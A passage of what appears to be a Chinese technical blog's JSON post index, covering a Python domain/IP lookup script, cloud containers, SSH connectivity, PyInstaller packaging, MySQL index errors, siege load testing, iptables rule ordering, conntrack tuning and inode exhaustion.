parser.add_argument(&apos;-d&apos;,&apos;--domain&apos;,dest=&quot;domain&quot;,help=&quot;指定需要查询的域名，例如: ba -d awen.me&quot;) parser.add_argument(&apos;-v&apos;,&apos;--version&apos;,dest=&quot;version&quot;,help=&quot;显示版本信息&quot;,action=&quot;store_true&quot;) parser.add_argument(&apos;-i&apos;,&apos;--ip&apos;,dest=&quot;ip&quot;,help=&quot;查询 IP 归属地，例如 ba -i 123.234.1.1&quot;) parser.add_argument(&apos;-a&apos;,&apos;--auth&apos;,dest=&quot;auth&quot;,help=&quot;显示作者信息&quot;,action=&quot;store_true&quot;) parser.add_argument(&apos;-u&apos;,&apos;--update&apos;,dest=&quot;update&quot;,help=&quot;升级程序&quot;,action=&quot;store_true&quot;) args = parser.parse_args() if args.domain: try: url = tldextract.extract(args.domain) except Exception as e: pass domain = url.domain+&quot;.&quot;+url.suffix print(&quot;正在查询域名:&quot;+colored(domain,&quot;yellow&quot;)) plan() print(&quot;===================================&quot;) req(domain) print(&quot;===================================&quot;) if args.version: print(&quot;当前版本:&quot;+VERSION) if args.auth: print(&quot;Auth:awen E-mail:hi@awen.me&quot;) print(&quot;E-mail:hi@awen.me&quot;) print(&quot;Blog:https://awen.me&quot;) if args.ip: if isIP(args.ip): print(&quot;正在查询 IP 归属:&quot;+colored(args.ip,&quot;yellow&quot;)) plan() print(&quot;===================================&quot;) query_ip(args.ip) print(&quot;===================================&quot;) else: print(colored(&quot;您输入的不是一个正确的 IP 地址！！&quot;,&quot;red&quot;)) if args.update: args.update = VERSION update(args.update) if __name__==&quot;__main__&quot;: menu()","categories":[],"tags":[{"name":"linux","slug":"linux","permalink":"https://awen.me/tags/linux/"}]},{"title":"如何使用网易云的容器服务","slug":"如何使用网易云的容器服务","date":"2017-10-27T08:23:48.000Z","updated":"2021-02-26T06:05:29.324Z","comments":true,"path":"posts/18767.html","link":"","permalink":"https://awen.me/posts/18767.html","excerpt":"本文主要讲解如何在网易云创建一个容器服务搭建 web 服务器。 准备工作 1.申请网易云账号，并进行实名认证 开始操作","text":"本文主要讲解如何在网易云创建一个容器服务搭建 web 服务器。 准备工作 1.申请网易云账号，并进行实名认证 开始操作 1.登录后台，选择容器服务，在默认的 default 空间中创建一个服务，当然你也可以自己创建一个空间，然后在对应的空间中创建服务 2.选择付费方式和容器名称和容器的服务状态，需要注意，我们这里创建的是 web 项目，有很多的文件需要保存，所以需要选择有状态服务。 3.进入下一步，选择镜像。 这里我们选择网易官方镜像中的 Ubuntu。 3.然后需要选择密钥，如果你没有可以点击创建密钥。 4.接下来我们要选择硬盘，我们需要把一些数据永久保存在这个磁盘上。 5.然后选择容器规格以及容器要放行的端口，需要注意，如果你要远程 SSH 和访问 web 服务，则需要放行22 端口和 80 端口 6.然后点击立即创建。 连接容器1.默认情况下，网易云都只提供内网连接的方式。如果你需要外网连接，需要申请弹性公网 IP 地址 绑定到容器上，具体操作步骤如下: 选择弹性公网 IP， 然后创建 IP，需要注意，我这里界面可能和你稍微不太一样 2.创建完 IP 地址之后，我们返回容器列表，可以看到我们刚才创建好的容器 3.点击容器名称进入服务详情，在该页面中找到网络信息–绑定公网 IP 4.绑定之后，就可以远程连接了 安装 web 服务这个就略了。 但是需要注意，你的文件内容需要放在你刚才设置容器时创建的磁盘对应的目录中，否则容器停止文件就木有啦~ 此外，这里只是简单演示下，如果 SSH，各位看官不要把容器和虚拟机或 vps 来比较，他们有本质上的区别，而且也不建议用 SSH 管理容器。建议要安装服务，先去看看 dockerfile 文件如何编写，在本地安装 docker 环境，把镜像编译好，push 到网易云的镜像仓库 然后创建容器选择自己的镜像文件启动容器。 关于更具体的内容，可以参考 https://www.163yun.com/help/documents/31444275297439744","categories":[],"tags":[{"name":"docker","slug":"docker","permalink":"https://awen.me/tags/docker/"}]},{"title":"一个SSH 无法连接的问题排查","slug":"一个SSH-无法连接的问题排查","date":"2017-10-26T04:10:52.000Z","updated":"2021-02-26T06:05:29.294Z","comments":true,"path":"posts/33855.html","link":"","permalink":"https://awen.me/posts/33855.html","excerpt":"有个客户做游戏的，反馈日本玩家连不上服务器，之前测试是运营商出口问题导致的。已经一个星期了，因为最近一直在开大会，估计和这个有影响，今天准备看看还能不能复现这个问题，于是自己去linode买了个日本的服务器准备测试，创建好主机后，就准备连接了。然后奇怪的事情来了。。","text":"有个客户做游戏的，反馈日本玩家连不上服务器，之前测试是运营商出口问题导致的。已经一个星期了，因为最近一直在开大会，估计和这个有影响，今天准备看看还能不能复现这个问题，于是自己去linode买了个日本的服务器准备测试，创建好主机后，就准备连接了。然后奇怪的事情来了。。 首先是 ping 直接没反映 然后ssh 换个墙外的主机测试，一切正常，说明在出口被禁掉了 更换一台主机测试，发现，居然可以ping通。但是ssh无法连接。 )!awen) 既然能 ping 通，说明路由是可达的，那肯定是端口被封了。于是修改 SSH 默认端口测试，可以连接了。 )!awen) 所以这说明了出口针对 linode 一部分网段的IP直接禁止了，而部分禁止了 SSH 端口的连接。 然后看到阿里云也有客户反馈国外 SSH 无法连接 )!awen) 恩，说明这并非只针对一个厂商。 最后，我有一句卖妈批不知道当讲不当讲！","categories":[],"tags":[{"name":"linux","slug":"linux","permalink":"https://awen.me/tags/linux/"}]},{"title":"打包python源码为二进制文件","slug":"打包python源码为二进制文件","date":"2017-10-26T01:53:49.000Z","updated":"2021-02-26T06:05:29.338Z","comments":true,"path":"posts/9208.html","link":"","permalink":"https://awen.me/posts/9208.html","excerpt":"我们都知道 python 是一门脚本解释性语言，不像 C 语言需要编译执行，有时候，我们需要把自己写好的脚本发给其他人使用，但是对方如果需要执行脚本则首先需要安装环境，安装对应的库，非常麻烦，那么我们能不能把脚本打包成一个二进制文件，其他人直接执行就可以呢？答案是当然可以了。使用 pyinstaller 可以非常轻松的发布你的程序。","text":"我们都知道 python 是一门脚本解释性语言，不像 C 语言需要编译执行，有时候，我们需要把自己写好的脚本发给其他人使用，但是对方如果需要执行脚本则首先需要安装环境，安装对应的库，非常麻烦，那么我们能不能把脚本打包成一个二进制文件，其他人直接执行就可以呢？答案是当然可以了。使用 pyinstaller 可以非常轻松的发布你的程序。 原理PyInstaller 其实就是把 python 解析器和你自己的脚本打包成一个可执行的文件，和编译成真正的机器码完全是两回事，所以千万不要指望成打包成一个可执行文件会提高运行效率，相反可能会降低运行效率，好处就是在运行者的机器上不用安装 python 和你的脚本依赖的库。在 Linux 操作系统下，它主要用的 binutil 工具包里面的 ldd 和 objdump 命令。 安装 pyinstallerpip install pyinstaller编译成二进制文件 pyinstaller -F mycript.py示例: 有一个 python 脚本，内容就是输出一行hello world。 ➜ testbin python hello.py hello world执行 pyinstaller -F hello.py 在当前目录下会有一个dist目录，里面的就是可执行文件 ➜ testbin ls build dist hello.py hello.spec ➜ testbin cd dist ➜ dist ls hello ➜ dist ./hello hello world 注意：只能在和打包机器系统同样的环境下,不同平台需要单独移植，也就是说，不具备可移植性，若需要在不同系统上运行，就必须针对该平台进行打包。","categories":[],"tags":[{"name":"python","slug":"python","permalink":"https://awen.me/tags/python/"}]},{"title":"Innodb 和 Mysql 索引不一致","slug":"Innodb-和-Mysql-索引不一致","date":"2017-10-25T02:10:29.000Z","updated":"2021-02-26T06:05:29.249Z","comments":true,"path":"posts/24755.html","link":"","permalink":"https://awen.me/posts/24755.html","excerpt":"","text":"客户反馈建立索引时报错，具体错误如下: [ERROR] Table db/table contains 7 indexes inside InnoDB, which is different from the number of indexes 6 defined in the MySQL查了下 mysql 官网的解释是说是索引没同步，导致 Innodb 和数据字典的内容不一致，这种情况建议关闭表后等待索引同步就好了 但是我们这边禁止了关闭表的命令。 这个是MySQL常见问题。应该是用户执行建索引ddl的时候，退出了或者出现异常导致的。 如果 flush table 搞不定，需要alter table的话，让用户来执行 ALTER TABLE table_name ENGINE=Innodb;但是执行 DDL 语句是有代价的，需要考虑客户是否一直用这个表，能重启最好，但是如果是 cache 的问题，那么直接 重启就好，如果是文件不一致还是需要执行 ALTER TABLE table_name ENGINE=Innodb; 参考:https://www.percona.com/blog/2011/11/29/innodb-vs-mysql-index-counts/","categories":[],"tags":[{"name":"mysql","slug":"mysql","permalink":"https://awen.me/tags/mysql/"}]},{"title":"强制网站使用 HTTPS 访问","slug":"强制网站使用-HTTPS-访问","date":"2017-10-22T03:17:42.000Z","updated":"2021-02-26T06:05:29.333Z","comments":true,"path":"posts/9611.html","link":"","permalink":"https://awen.me/posts/9611.html","excerpt":"现在很多网站都开启了 HTTPS，但是有一些网站是默认走 HTTP 协议的，因为 HTTPS 加密会浪费掉一些服务器资源和带宽，有一定影响，但是对于我来说，我不希望任何浏览器信息被匿名者截取，哪怕是我看一个视频短片，另外 HTTP 太容易劫持了。相信没有任何人希望自己浏览网页的同时看见页面中穿插着各种广告。而 HTTPS 可以有效的防止页面劫持。 如果你也是和我一个样有这种网络洁癖的人，我推荐你安装浏览器插件 HTTPS EVerywhere，它可以强制浏览器使用 HTTPS，如果有的话。","text":"现在很多网站都开启了 HTTPS，但是有一些网站是默认走 HTTP 协议的，因为 HTTPS 加密会浪费掉一些服务器资源和带宽，有一定影响，但是对于我来说，我不希望任何浏览器信息被匿名者截取，哪怕是我看一个视频短片，另外 HTTP 太容易劫持了。相信没有任何人希望自己浏览网页的同时看见页面中穿插着各种广告。而 HTTPS 可以有效的防止页面劫持。 如果你也是和我一个样有这种网络洁癖的人，我推荐你安装浏览器插件 HTTPS EVerywhere，它可以强制浏览器使用 HTTPS，如果有的话。 比如腾讯视频，如果不启用插件，他默认是 http://v.qq.com,而启用插件后则会在地址栏中显示 https://v.qq.com 如图所示:","categories":[],"tags":[{"name":"https","slug":"https","permalink":"https://awen.me/tags/https/"}]},{"title":"压测工具 siege 使用","slug":"压测工具-siege-使用","date":"2017-10-20T08:26:09.000Z","updated":"2021-02-26T06:05:29.318Z","comments":true,"path":"posts/59616.html","link":"","permalink":"https://awen.me/posts/59616.html","excerpt":"ABOUT SIEGESiege is an http load testing and benchmarking utility. It was designed to let web developers measure their code under duress, to see how it will stand up to load on the internet. Siege supports basic authentication, cookies, HTTP, HTTPS and FTP protocols. It lets its user hit a server with a configurable number of simulated clients. Those clients place the server “under siege.” 官网 说了一堆，为啥不用 ab 或 flood 呢？ 因为那俩玩意我都没编译成功 https，这个搞定了。","text":"ABOUT SIEGESiege is an http load testing and benchmarking utility. It was designed to let web developers measure their code under duress, to see how it will stand up to load on the internet. Siege supports basic authentication, cookies, HTTP, HTTPS and FTP protocols. It lets its user hit a server with a configurable number of simulated clients. Those clients place the server “under siege.” 官网 说了一堆，为啥不用 ab 或 flood 呢？ 因为那俩玩意我都没编译成功 https，这个搞定了。 编译安装wget -c http://download.joedog.org/siege/siege-3.1.4.tar.gz tar zxvf siege-3.1.4.tar.gz cd siege-3.1.4 ./configure --prefix=/usr/local/siege --with-ssl=/usr/include/openssl/ make &amp;&amp; make install使用常用的参数： -c 200 并发200个用户-r 150 重复循环150次-f file 任务的URL列表 其它实用参数： -i 随机 URL ,默认是从列表的上面到下面来打压力-b 进行压力测试,不进行延时-t 持续时间,即测试持续时间,在NUM时间后结束,单位默认为分 测试1：指定列表 ./siege -c 200 -r 10 -f /opt/24k -b -i结果 HTTP/1.1 200 0.30 secs: 9604 bytes ==&gt; GET /post/48192.html HTTP/1.1 200 0.29 secs: 9604 bytes ==&gt; GET /post/48192.html HTTP/1.1 200 0.29 secs: 9604 bytes ==&gt; GET /post/48192.html HTTP/1.1 200 0.29 secs: 9604 bytes ==&gt; GET /post/48192.html done. Transactions: 2000 hits Availability: 100.00 % Elapsed time: 24.26 secs Data transferred: 18.32 MB Response time: 2.28 secs Transaction rate: 82.44 trans/sec Throughput: 0.76 MB/sec Concurrency: 187.81 Successful transactions: 2000 Failed transactions: 0 Longest transaction: 7.41 Shortest transaction: 0.26 LOG FILE: /usr/local/siege/var/siege.log You can disable this log file notification by editing /root/.siege/siege.conf and changing &apos;show-logfile&apos; to false.测试2 ：直接给定 url ./siege -c 200 -r 10 -b https://awen.me","categories":[],"tags":[{"name":"linux","slug":"linux","permalink":"https://awen.me/tags/linux/"}]},{"title":"iptables 顺序问题导致规则无法执行","slug":"iptables-顺序问题导致规则无法执行","date":"2017-10-20T02:37:42.000Z","updated":"2021-02-26T06:05:29.274Z","comments":true,"path":"posts/48192.html","link":"","permalink":"https://awen.me/posts/48192.html","excerpt":"客户端和服务端均属于内网分别是 客户端: 10.173.32.75/21服务端: 10.173.32.78/21 目前客户希望内网的 10.173.32.78 的3306端口 只能被10.173.32.75 连接。","text":"客户端和服务端均属于内网分别是 客户端: 10.173.32.75/21服务端: 10.173.32.78/21 目前客户希望内网的 10.173.32.78 的3306端口 只能被10.173.32.75 连接。 开启防火墙并配置规则如下: [root@server ~]# cat /etc/sysconfig/iptables # Generated by iptables-save v1.4.21 on Fri Oct 20 10:01:35 2017 *filter :INPUT DROP [0:0] :FORWARD ACCEPT [0:0] :OUTPUT ACCEPT [41:4460] -A INPUT -m state --state RELATED,ESTABLISHED -j ACCEPT -A INPUT -p tcp -m tcp --dport 22 -j ACCEPT -A INPUT -j REJECT --reject-with icmp-host-prohibited -A FORWARD -j REJECT --reject-with icmp-host-prohibited -A INPUT -s 10.173.32.75/32 -p tcp -m tcp --dport 3306 -j ACCEPT COMMIT # Completed on Fri Oct 20 10:01:35 2017然后经过测试发现，对端10.173.32.75 无法连接到服务端的3306端口 服务端 [root@server ~]# nc -l 3306 &lt; 1.txt客户提示没有路由 [root@client ~]# nc -n 10.173.32.78 3306 Ncat: No route to host.解决1.关闭防火墙测试没问题。说明99.9%是和防火墙的设置有关系。2.测试上面配置文件中的第二条规则，连接22端口 [root@client ~]# nc -n 10.173.32.78 22 SSH-2.0-OpenSSH_6.6.1发现没有问题，猜测是下面的2条规则出现了问题 -A INPUT -j REJECT --reject-with icmp-host-prohibited -A FORWARD -j REJECT --reject-with icmp-host-prohibited3.调整规则顺序，因为 iptables的规则是按顺序匹配的。 -A INPUT -m state --state RELATED,ESTABLISHED -j ACCEPT -A INPUT -p tcp -m tcp --dport 22 -j ACCEPT -A INPUT -s 10.173.32.75/32 -p tcp -m tcp --dport 3306 -j ACCEPT -A INPUT -j REJECT --reject-with icmp-host-prohibited -A FORWARD -j REJECT --reject-with icmp-host-prohibited调整为如上规则后重启防火墙 [root@server ~]# vim /etc/sysconfig/iptables [root@server ~]# systemctl restart iptables [root@server ~]# nc -l 3306 &lt; 1.txt 111客户端测试，OK了。 [root@client ~]# nc -n 10.173.32.78 3306 111那为什么为这样呢？我们先来看这两条规则的含义 -A INPUT -j REJECT --reject-with icmp-host-prohibited -A FORWARD -j REJECT --reject-with icmp-host-prohibitedREJECT：拒绝请求，详见:DROP 和REJECT的区别 –reject-with 后面跟上的是 icmp-host-prohibited。 这两条的意思是在INPUT表和FORWARD表中拒绝所有其他不符合上述任何一条规则的数据包。并且发送一条host prohibited 的消息给被拒绝的主机。 host prohibited 是icmp 协议状态的一种，其他的如: icmp-net-unreachable ICMP network unreachable net-unreach alias icmp-host-unreachable ICMP host unreachable host-unreach alias icmp-proto-unreachable ICMP protocol unreachable proto-unreach alias icmp-port-unreachable ICMP port unreachable (default) port-unreach alias icmp-net-prohibited ICMP network prohibited net-prohib alias icmp-host-prohibited ICMP host prohibited host-prohib alias tcp-reset TCP RST packet tcp-rst alias icmp-admin-prohibited ICMP administratively prohibited (*) admin-prohib alias因为这两条规则的存在，其他任何数据包只要在其下面的都会被拒绝。所以需要调整期执行顺序。","categories":[],"tags":[{"name":"linux","slug":"linux","permalink":"https://awen.me/tags/linux/"}]},{"title":"iptables 的 conntrack 连接跟踪模块","slug":"iptables-的-conntrack-连接跟踪模块","date":"2017-10-19T11:03:23.000Z","updated":"2021-02-26T06:05:29.274Z","comments":true,"path":"posts/59062.html","link":"","permalink":"https://awen.me/posts/59062.html","excerpt":"nf_conntrack连接跟踪模块在iptables里，包是和被跟踪连接的四种不同状态有关的。它们分别是NEW，ESTABLISHED，RELATED和INVALID。后面我们会深入地讨论每一个状态。使用iptables的state模块可以匹配操作这几种状态，我们能很容易地控制“谁或什么能发起新的会话”。为什么需要这种状态跟踪机制呢？比如你的80端口开启，而你的程序被植入反弹式木马，导致服务器主动从80端口向外部发起连接请求，这个时候你怎么控制呢。关掉80端口，那么你的网站也无法正常运行了。但有了连接跟踪你就可以设置只允许回复关于80端口的外部请求（ESATBLISHED状态），而无法发起向外部的请求（NEW状态）。所以有了连接跟踪就可以做到在这种层面上的限制，慢慢往下看就明白了各状态的意义。","text":"nf_conntrack连接跟踪模块在iptables里，包是和被跟踪连接的四种不同状态有关的。它们分别是NEW，ESTABLISHED，RELATED和INVALID。后面我们会深入地讨论每一个状态。使用iptables的state模块可以匹配操作这几种状态，我们能很容易地控制“谁或什么能发起新的会话”。为什么需要这种状态跟踪机制呢？比如你的80端口开启，而你的程序被植入反弹式木马，导致服务器主动从80端口向外部发起连接请求，这个时候你怎么控制呢。关掉80端口，那么你的网站也无法正常运行了。但有了连接跟踪你就可以设置只允许回复关于80端口的外部请求（ESATBLISHED状态），而无法发起向外部的请求（NEW状态）。所以有了连接跟踪就可以做到在这种层面上的限制，慢慢往下看就明白了各状态的意义。 所有在内核中由Netfilter的特定框架做的连接跟踪称作conntrack（connection tracking）。conntrack可以作为模块安装，也可以作为内核的一部分。大部分情况下，我们想要也需要更详细的连接跟踪，这是相比于缺省的conntrack而言。也因为此，conntrack中有许多用来处理TCP，UDP或ICMP协议的部件。这些模块从数据包中提取详细的、唯一的信息，因此能保持对每一个数据流的跟踪。这些信息也告知conntrack流当前的状态。例如，UDP流一般由他们的目的地址、源地址、目的端口和源端口唯一确定。 在以前的内核里，我们可以打开或关闭重组功能。然而连接跟踪被引入内核后，这个选项就被取消了。因为没有包的重组，连接跟踪就不能正常工作。现在重组已经整合入conntrack，并且在conntrack启动时自动启动。不要关闭重组功能，除非你要关闭连接跟踪。 除了本地产生的包由OUTPUT链处理外，所有连接跟踪都是在PREROUTING链里进行处理的，意思就是， iptables会在PREROUTING链里从新计算所有的状态。如果我们发送一个流的初始化包，状态就会在OUTPUT链里被设置为NEW，当我们收到回应的包时，状态就会在PREROUTING链里被设置为ESTABLISHED。如果第一个包不是本地产生的，那就会在PREROUTING链里被设置为NEW状态。综上，所有状态的改变和计算都是在nat表中的PREROUTING链和OUTPUT链里完成的。 conntrack默认最大跟踪65536个连接，查看当前系统设置最大连接数 [root@server ~]# cat /proc/sys/net/netfilter/nf_conntrack_max 65536查看连接跟踪有多少条目 [root@server ~]# cat /proc/sys/net/netfilter/nf_conntrack_count 1当服务器连接多于最大连接数时会出现kernel: ip_conntrack: table full, dropping packet的错误。 解决方法，修改conntrack最大跟踪连接数： [root@server ~]# vim /etc/sysctl.conf [root@server ~]# sysctl -p net.nf_conntrack_max = 100000查看established连接状态最多保留几天，默认是432000秒，就是5天；如果觉得时间太长可以修改。还有各种tcp连接状态的保留时间，都可以修改的。 [root@server ~]# cat /proc/sys/net/netfilter/nf_conntrack_tcp_timeout_established 432000 连接跟踪（conntrack）记录IP_conntrack模块根据IP地址可以实时追踪本机TCP/UDP/ICMP的连接详细信息并保存在内存中“/proc/net/nf_conntrack”文件中（Centos5中使用的是/proc/net/ip_conntrack）。查看这个文件的记录会有如下信息： ipv4 2 tcp 6 89 SYN_SENT src=101.81.225.225 dst=112.74.99.130 sport=33952 dport=80 src=112.74.99.130 dst=101.81.225.225 sport=80 dport=33952 [UNREPLIED] mark=0 secmark=0 use=2 1 2 ipv4 2 tcp 6 89 SYN_SENT src=101.81.225.225 dst=112.74.99.130 sport=33952 dport=80 src=112.74.99.130 dst=101.81.225.225 sport=80 dport=33952 [UNREPLIED] mark=0 secmark=0 use=2IP_conntrack模块维护的所有信息都包含在这个例子中了，通过它们就可以知道某个特定的连接处于什么状态。首先显示的是IP类型，然后是协议，这里是tcp，接着是十进制的6（tcp的协议类型代码是6）。之后的89是这条conntrack记录的生存时间（TTL），它会有规律地被消耗，直到收到这个连接的更多的包。那时，这个值就会被设为当时那个状态的缺省值。接下来的是这个连接在当前时间点的状态。上面的例子说明这个包处在状态 SYN_SENT，这个值是iptables显示的，以便我们好理解，而内部用的值稍有不同。SYN_SENT说明我们正在观察的这个连接只在一个方向发送了一TCP SYN包。再下面是源地址、目的地址、源端口和目的端口。最后，是希望接收的应答包的信息，他们的地址和端口和前面是相反的。其中有个特殊的词[UNREPLIED]，说明这个连接还没有收到任何回应。 当一个连接在两个方向上都有传输时，conntrack记录就删除[UNREPLIED]标志，然后重置。在末尾有[ASSURED]的记录说明两个方向已没有流量。 ipv4 2 tcp 6 431962 ESTABLISHED src=101.81.225.225 dst=112.74.99.130 sport=33952 dport=80 src=112.74.99.130 dst=101.81.225.225 sport=80 dport=33952 [ASSURED] mark=0 secmark=0 use=2 1 2 ipv4 2 tcp 6 431962 ESTABLISHED src=101.81.225.225 dst=112.74.99.130 sport=33952 dport=80 src=112.74.99.130 dst=101.81.225.225 sport=80 dport=33952 [ASSURED] mark=0 secmark=0 use=2这样的记录是确定的，在连接跟踪表满时，是不会被删除的，没有[ASSURED]的记录就要被删除。连接跟踪表能容纳多少记录是被一个变量控制的，默认值取决于你的内存大小，128MB可以包含8192条目录，256MB是16376条，在拥有较大内存的机器中默认65536条。对于一个高并发的web服务器来说，如果你的请求数大过/proc/sys/net/netfilter/nf_conntrack_max文件中定义的数目，那么就会出现用户连接失败并且报错，报错信息如下： nf_conntrack: table full, dropping packet. 1 nf_conntrack: table full, dropping packet.而我们第一时间想到的办法就是关闭防火墙或是增大默认连接数，修改默认最大值，如下: [root@localhost ~]# echo &quot;100000&quot; &gt; /proc/sys/net/netfilter/nf_conntrack_max 1 [root@localhost ~]# echo &quot;100000&quot; &gt; /proc/sys/net/netfilter/nf_conntrack_max但不要盲目增大nf_conntrack_max的值-理解Linux内核内存分配 连接追踪模块属于内核的，所以我们知道所有的连接跟踪信息都是保存于内存中的，因此会考虑单纯放大这个nf_conntrack_max参数会占据多少内存，会权衡内存的占用，如果系统没有太大的内存，就不会将此值设置的太高。但是如果你的系统有很大的内存呢？比如有8G的内存，分个1G给连接跟踪也不算什么啊，这是合理的，然而在传统的32位架构Linux中是做不到，为什么？首先32位架构中最大寻址能力是4G，而Linux内存管理是虚拟内存的方式，4G内存分给内存的是1G，其他3G是理论上分给单个进程的，每个进程认为自己有3G内存可用，最后是根据每个进程实际使用的内存映射到物理内存中去。 内存越来越便宜的今天，Linux的内存映射方式确实有点过时了。然而事实就摆在那里，nf_conntrack处于内核空间，它所需的内存必须映射到内核空间，而传统的32位Linux内存映射方式只有1G属于内核，这1G的地址空间中，前896M是和物理内存一一线性映射的，后面的若干空洞之后，有若干vmalloc的空间，这些vmalloc空间和一一映射空间相比，很小很小，算上4G封顶下面的很小的映射空间，一共可以让内核使用的地址空间不超过1G。对于ip_conntrack来讲，由于其使用slab分配器，因此它还必须使用一一映射的地址空间，这就是说，它最多只能使用不到896M的内存！ 为何Linux使用如此“落后”的内存映射机制这么多年还不改进？其实这种对内核空间内存十分苛刻的设计在64位架构下有了很大的改观，也可以放心根据内存调整最大连接追踪条目了。但问题依然存在，即使64位架构，内核也无法做到透明访问所有的物理内存，它同样需要把物理内存映射到内核地址空间后才能访问，对于一一映射，这种映射是事先确定的，对于大小有限(实际上很小)非一一映射空间，需要动态创建页表，页目录等。所以条目太多就会消耗性能且会产生内存碎片。另外如果不需要用到连接跟踪功能可以选择在Iptables中关闭，以此来提高系统的网络连接性能（因为开启会产生大量的IO操作）。卸载ip_conntrack模块如下，必须要先关闭防火墙才能卸载。另外注意当你试图查看iptables规则之后，就会激活ip_conntrack模块，无法真正卸载掉哦。 $ service iptables stop $ modprobe -r nf_conntrack 1 2 $ service iptables stop $ modprobe -r nf_conntrack查看实时连接信息查看ip_conntrack实时连接状态信息，安装iptstate工具 yum -y install iptstate 执行命令 [root@server ~]# iptstate 如下所示 相关的内核参数[root@server ~]# sysctl -a | grep conntrack net.netfilter.nf_conntrack_acct = 0 net.netfilter.nf_conntrack_buckets = 16384 net.netfilter.nf_conntrack_checksum = 1 net.netfilter.nf_conntrack_count = 1 net.netfilter.nf_conntrack_events = 1 net.netfilter.nf_conntrack_events_retry_timeout = 15 net.netfilter.nf_conntrack_expect_max = 256 net.netfilter.nf_conntrack_generic_timeout = 600 net.netfilter.nf_conntrack_helper = 1 net.netfilter.nf_conntrack_icmp_timeout = 30 net.netfilter.nf_conntrack_log_invalid = 0 net.netfilter.nf_conntrack_max = 65536 net.netfilter.nf_conntrack_tcp_be_liberal = 0 net.netfilter.nf_conntrack_tcp_loose = 1 net.netfilter.nf_conntrack_tcp_max_retrans = 3 net.netfilter.nf_conntrack_tcp_timeout_close = 10 net.netfilter.nf_conntrack_tcp_timeout_close_wait = 60 net.netfilter.nf_conntrack_tcp_timeout_established = 432000 net.netfilter.nf_conntrack_tcp_timeout_fin_wait = 120 net.netfilter.nf_conntrack_tcp_timeout_last_ack = 30 net.netfilter.nf_conntrack_tcp_timeout_max_retrans = 300 net.netfilter.nf_conntrack_tcp_timeout_syn_recv = 60 net.netfilter.nf_conntrack_tcp_timeout_syn_sent = 120 net.netfilter.nf_conntrack_tcp_timeout_time_wait = 120 net.netfilter.nf_conntrack_tcp_timeout_unacknowledged = 300 net.netfilter.nf_conntrack_timestamp = 0 net.netfilter.nf_conntrack_udp_timeout = 30 net.netfilter.nf_conntrack_udp_timeout_stream = 180 net.nf_conntrack_max = 65536也可以使用 dmesg 查看。 [root@server ~]# dmesg | tail -f [ 3.656918] ppdev: user-space parallel port driver [ 3.680022] alg: No test for __gcm-aes-aesni (__driver-gcm-aes-aesni) [ 3.772029] alg: No test for crc32 (crc32-pclmul) [ 3.785294] intel_rapl: no valid rapl domains found in package 0 [ 7.120138] EXT4-fs (vda1): resizing filesystem from 786176 to 5242304 blocks [ 7.422160] EXT4-fs (vda1): resized filesystem to 5242304 [ 1994.617368] nf_conntrack version 0.5.0 (16384 buckets, 65536 max) [ 3657.011241] nr_pdflush_threads exported in /proc is scheduled for removal [ 4538.293958] Netfilter messages via NETLINK v0.30. [ 4538.300128] ctnetlink v0.93: registering with nfnetlink.","categories":[],"tags":[{"name":"linux","slug":"linux","permalink":"https://awen.me/tags/linux/"}]},{"title":"小技巧:让ping 命令更人性化","slug":"小技巧-让ping-命令更人性化","date":"2017-10-19T05:53:02.000Z","updated":"2021-02-26T06:05:29.333Z","comments":true,"path":"posts/40408.html","link":"","permalink":"https://awen.me/posts/40408.html","excerpt":"在工作中，经常会遇到一个问题，就是测试某个网站或站点的连通性，通常我们都会使用 ping nc telnet mtr 等命令进行测试。可是有时候客户丢过来的是一条这样的url: http|https://xxx.xxx.com/a/b/c.html我们拿到 url 之后，还需要删除前面的 http:// 或 https:// 才能进行测试。虽然在命令行删除也比较方便。但是我总是笔记懒的。感觉这个命令使用频率非常高，如果每次拿到 URL 都要去删，这无疑是很浪费时间的重复性工作。","text":"在工作中，经常会遇到一个问题，就是测试某个网站或站点的连通性，通常我们都会使用 ping nc telnet mtr 等命令进行测试。可是有时候客户丢过来的是一条这样的url: http|https://xxx.xxx.com/a/b/c.html我们拿到 url 之后，还需要删除前面的 http:// 或 https:// 才能进行测试。虽然在命令行删除也比较方便。但是我总是笔记懒的。感觉这个命令使用频率非常高，如果每次拿到 URL 都要去删，这无疑是很浪费时间的重复性工作。 我们可以这样调整，写一个函数 eping，里面首先对传入的参数进行简单的字符串判断，如果字符串开头包含 http 或 https 则进行相应的处理后在进行 eping。 eping () { if [[ $1 =~ ^&quot;http&quot; ]] then echo $1 | awk -F&apos;[/:]&apos; &apos;{print $4}&apos; | xargs ping else /sbin/ping $1 fi }把上面的代码保存到 ~/.zhsrc 中（注:我这里是有的是 zsh），执行 source ~/.zshrc尝试下吧！ 注意，由于我是 mac 系统ping 的实际命令是在 /sbin/ping，如果是 linux 请使用 whereis ping 查看 [root@centos7 ~]# whereis ping ping: /usr/bin/ping /usr/share/man/man8/ping.8.gz","categories":[],"tags":[{"name":"linux","slug":"linux","permalink":"https://awen.me/tags/linux/"}]},{"title":"Linux 提示磁盘满 No space left on device 的问题分析","slug":"Linux-提示磁盘满-No-space-left-on-device-的问题分析","date":"2017-10-18T07:50:43.000Z","updated":"2021-02-26T06:05:29.255Z","comments":true,"path":"posts/48763.html","link":"","permalink":"https://awen.me/posts/48763.html","excerpt":"问题在目录创建文件的时候 提示 No space left on device [root@centos7 mnt]# mkdir test mkdir: cannot create directory ‘test’: No space left on device [root@centos7 mnt]#","text":"问题在目录创建文件的时候 提示 No space left on device [root@centos7 mnt]# mkdir test mkdir: cannot create directory ‘test’: No space left on device [root@centos7 mnt]# 排查遇到这个问题，一般人首先会想到使用 df -h 去查看空间使用情况。 [root@centos7 mnt]# df -h Filesystem Size Used Avail Use% Mounted on /dev/vda1 20G 2.1G 17G 11% / devtmpfs 874M 0 874M 0% /dev tmpfs 884M 0 884M 0% /dev/shm tmpfs 884M 25M 860M 3% /run tmpfs 884M 0 884M 0% /sys/fs/cgroup tmpfs 177M 0 177M 0% /run/user/0 /dev/vdc 9.8G 52M 9.2G 1% /mnt检查发现 mnt 对应的磁盘 vdc 使用率才 1%，然而却无法写入文件了。这是为什么？很多人在排查到这一步的时候就疑惑不解了。明明磁盘还没满呀！ 如果你也是这么想的，说明你的基础打的不扎实。 我们继续通过下面的命令 df -i 查看inode信息，发现vdc 这块盘的inode使用率已经达到了 100% [root@centos7 mnt]# df -i Filesystem Inodes IUsed IFree IUse% Mounted on /dev/vda1 1310720 39389 1271331 4% / devtmpfs 223643 353 223290 1% /dev tmpfs 226153 1 226152 1% /dev/shm tmpfs 226153 416 225737 1% /run tmpfs 226153 16 226137 1% /sys/fs/cgroup tmpfs 226153 1 226152 